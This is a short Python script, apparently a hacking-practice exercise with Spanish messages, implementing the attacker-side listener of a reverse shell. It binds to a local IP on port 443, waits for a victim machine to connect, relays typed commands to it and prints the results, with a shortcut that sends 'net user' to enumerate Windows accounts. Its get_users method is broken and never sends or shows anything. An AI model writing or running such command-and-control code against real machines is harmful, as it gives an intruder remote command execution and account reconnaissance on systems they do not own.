#!/usr/bin/env python3

import socket
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...", 'red'))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


class Listener:
    
    def __init__(self, ip, port):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()
    
        print(f"[!] Listening...\n\n")
        self.client_socket, client_address = server_socket.accept()
        print(f"[+] Connection establishment by {client_address}\n")
    
    def execute(self,command):

        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def get_users(self):
        self.client_socket(b"net user")
        output_command = self.client_socket.recv(2048).decode()


    def run(self):
        while True:
            command = input(">> ")
            if command == "get users":
                self.get_users()
            else:
                command_output = self.execute(command)
                print(command_output)

if __name__ == "__main__":

    my_listener = Listener("192.168.1.214", 443)
    my_listener.run()
